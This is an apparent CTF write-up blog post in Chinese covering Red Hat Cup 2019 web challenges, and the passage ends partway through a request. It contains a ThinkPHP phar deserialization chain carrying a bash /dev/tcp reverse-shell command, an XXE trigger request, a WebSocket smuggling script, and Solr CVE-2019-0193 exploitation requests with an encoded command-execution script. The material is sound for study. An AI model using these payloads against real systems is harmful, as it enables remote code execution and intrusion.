<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="红帽杯 2019 Web Write Up (除 iCloudMusic
"><title>Red Hat 2019 Web Write Up</title><link rel=canonical href=https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Red Hat 2019 Web Write Up"><meta property="og:description" content="红帽杯 2019 Web Write Up (除 iCloudMusic
"><meta property="og:url" content="https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2019-11-13T15:18:06+00:00"><meta property="article:modified_time" content="2019-11-13T15:18:06+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Red Hat 2019 Web Write Up"><meta name=twitter:description content="红帽杯 2019 Web Write Up (除 iCloudMusic
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2019/11/13/Red-Hat-2019/>Red Hat 2019 Web Write Up</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Nov 13, 2019</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><p>红帽杯 2019 Web Write Up (除 iCloudMusic</p><p>[TOC]</p><h2 id=ticket_system>Ticket_System</h2><p>XXE 2 Phar 反序列化加 Nu1lCTF sql_manager 的 thinkphp pop 链就行了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\process\pipes</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Windows</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$files</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$files</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>files</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$files</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model\concern</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>trait</span> <span class=nx>Conversion</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$append</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;Zedd&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>trait</span> <span class=nx>Attribute</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$withAttr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;Zedd&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;system&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=nf>get</span><span class=p>(</span><span class=nv>$system</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;Zedd&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;</span><span class=si>$system</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>abstract</span> <span class=k>class</span> <span class=nc>Model</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>use</span> <span class=nx>model\concern\Attribute</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>use</span> <span class=nx>model\concern\Conversion</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>think\Model</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Pivot</span> <span class=k>extends</span> <span class=nx>Model</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$system</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=nv>$system</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Conver</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\model\Pivot</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;sh &gt;&amp; /dev/tcp/you r_ip/port 0&gt;&amp;1&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\process\pipes\Windows</span><span class=p>(</span><span class=nv>$Conver</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;phar.readonly&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span> <span class=c1>//后缀名必须为phar
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span> <span class=c1>//设置stub
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span> <span class=c1>//将自定义的meta-data存入manifest
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span> <span class=c1>//添加要压缩的文件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//签名自动计算
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>rename</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>,</span><span class=s1>&#39;phar.xml&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>传这个 xml 上去之后再发以下请求：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/postxml</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv:8000</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=e4gevanqetq7dvri2q8ujh68hr</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/xml;charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>229</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;phar:///tmp/uploads/28b20c7474c6127c57486e26ad1442b9/20191110/e08b7a076a3d519f8936d3d8b8c17a27.xml&#39;&gt;</span>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;user&gt;&lt;username&gt;</span><span class=ni>&amp;test;</span><span class=nt>&lt;/username&gt;&lt;password&gt;</span>admin<span class=nt>&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><p>用 XXE 触发 phar 反序列化即可。</p><p>我看有些师傅还在为<code>/readflag</code>头疼&mldr;这也不是啥新玩意了，可以直接用<code>trap "" 14</code>就可以让验证码停下来了。</p><h2 id=bank_service>bank_service</h2><p><strong>Second Blood</strong></p><p>做的还是比较有意思的一题，可惜当时做的比较zz，本来可以一血，就是因为自己弄的太不小心了。</p><p>因为之前一直在研究 HTTP Smuggling 的东西，我在腾讯的导师也对这个挺感兴趣的，前阵子给我发了一个 Websocket Smuggling</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113011351.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113011351.png loading=lazy></a></figure></p><p>看完后一脸懵逼，文章跟之前 Black Hat 2019 HTTP Desync 那个议题一样，只说了有这么个攻击面，但是没有说怎么产生的，但是还好给了 POC 以及一些 challs ，虽然我当时复现了一下，但是依然懵逼。</p><p>直到作者终于在前几天把 <a class=link href=https://github.com/0ang3el/websocket-smuggle target=_blank rel=noopener>websocket-smuggle</a> 攻击原理用文章描述了出来，恰巧这次比赛也出到了这么个题目，所以看到题目用了 websocket ，我就猜可能是这个攻击面了。</p><p>这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理<code>Sec-WebSocket-Version</code> 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行 Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。</p><p>我们再回到题目，题目的 zz 客服只会重复一句话</p><blockquote><p>​ 我们基于solr提供优质的银行信息搜索服务。</p></blockquote><p>那应该就是提示 solr 了，前阵子有个 <a class=link href=https://paper.seebug.org/1009/ target=_blank rel=noopener>solr RCE</a> &mldr;但是我们直接访问 solr 服务是 403 &mldr;</p><p>于是我们尝试直接用 Smuggling 探测 solr 服务</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>req1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s2>Host: 47.105.57.19:3000
</span></span></span><span class=line><span class=cl><span class=s2>Sec-WebSocket-Version: 1338
</span></span></span><span class=line><span class=cl><span class=s2>Upgrade: websocket
</span></span></span><span class=line><span class=cl><span class=s2>Cookie: user=admin; io=wdvnH-5hbXMU4XPFAC_O
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>req2</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /solr HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s2>Host: localhost:8983
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>netloc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>netloc</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print req2</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span> <span class=o>=</span> <span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span> <span class=o>=</span> <span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>shutdown</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SHUT_RDWR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>(</span><span class=s1>&#39;47.105.57.19:3000&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>发现是个302跳转&mldr;</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112113326.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112113326.png loading=lazy></a></figure></p><p>看来还是得起本地环境来试试看，刚好 <a class=link href=https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193 target=_blank rel=noopener>vulhub</a> 有一个环境（p牛辣是真的牛批</p><p>直接起起来，然后发现 solr 的入口是 <code>/solr/#/</code> ，然后我们把 req2 的请求部分改成 <code>/solr/#/</code>就可以看到页面内容了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>req2</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /solr/#/ HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s2>Host: localhost:8983
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>可惜这个 Smuggling 技术貌似没有直接能像代理一样的功能，不能用浏览器直接浏览内容，每次只能自己去分析回显，不过这个题也不需要用到渲染交互什么的，直接都是可以发送 api 请求的。</p><p>于是我们本地起环境，用 Github 上几个 exp 试了一下，发现有外连的我本地可以成功，但是打远程不行&mldr;</p><p>然后我仔细看了 <a class=link href=https://github.com/1135/solr_exploit target=_blank rel=noopener>solr_exploit</a> poc 以及 <a class=link href=https://paper.seebug.org/1009/#poc-_2 target=_blank rel=noopener>PoC第三阶段&ndash;无外连+有回显</a>，想必应该就是这个了吧，后来给出的 hint 也验证了这一点，就是需要构造那篇文章当中打了码的 POC (又是一个看图猜 POC 的题，我要吐了</p><h3 id=侧信道攻击>侧信道攻击</h3><p><del>于是我拿着这个图找了一些 PS 大神进行处理，结果淘宝卖家说我是第四个找他们处理的人了.jpg</del></p><p>于是开始了漫漫 POC 猜测之路，首先我们看图可以发现图中有两个蓝色的快，那么第一行有没有可能是:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span></code></pre></div><p>让我们试试看，把 burp 与文章 burp 拉到同样高度，然后 xml 标签之后随便弄几个 payload</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112180836.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112180836.png loading=lazy></a></figure></p><p>我靠，简直一毛一样 XD</p><p>我感觉我要一血了，侧信道攻击真的牛批。然而正如上图，他喵的还是没回显啊&mldr;</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112115732.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112115732.png loading=lazy></a></figure></p><p>Emmm&mldr;.陷入沉思</p><h3 id=稍加思索>稍加思索</h3><p>在 github 那个 repo 中我们可以发现其实<a class=link href=https://www.cnblogs.com/sevck/p/11842811.html target=_blank rel=noopener>检测漏洞 - Exploit2</a>用的也是 @Longofo 师傅在那篇文章说的 ContentStreamSource</p><blockquote><p>​ 在相关概念中说到了ContentStreamDataSource能接收Post数据作为数据源，结合第一阶段说到的dynamicField就能实现回显了。</p></blockquote><p>一开始不熟悉 java 的我看到这也很懵逼，怎么就能实现回显了&mldr;然后我们可以看看那个 github repo exp2，我也着实看了好久</p><p>在我用这个 exp2 的第四步，也就是开启远程流这个步骤，如果直接按照这个做法的话，是直接得到了 403 Forbidden</p><blockquote><p>​ 该步骤是为了修改<code>configoverlay.json</code>文件中的配置 以启用远程流的相关选项 <code>.enableStreamBody</code> <code>.enableRemoteStreaming</code></p><p>替换<code>tika</code>为索引库名称</p><pre tabindex=0><code>POST /solr/tika/config HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-type:application/json
Content-Length: 159
Connection: close

{&#34;set-property&#34;: {&#34;requestDispatcher.requestParsers.enableRemoteStreaming&#34;: true}, &#34;set-property&#34;: {&#34;requestDispatcher.requestParsers.enableStreamBody&#34;: true}}
</code></pre><p>响应200即成功(实际测试 8.1可以成功)</p><p>响应500即失败(实际测试 某些低版本会失败)</p></blockquote><p>所以我们不得不只能走另一种方式，不用开启 streambody 的方法。</p><p>然后开始了漫长的 fuzz 过程，可能我理解得比较慢，导致做的也比较慢，这里我们可以看到这个利用 streambody 构造的 POC</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/solr/tika/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>solr.com:8983</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://solr.com:8983/solr/</span>
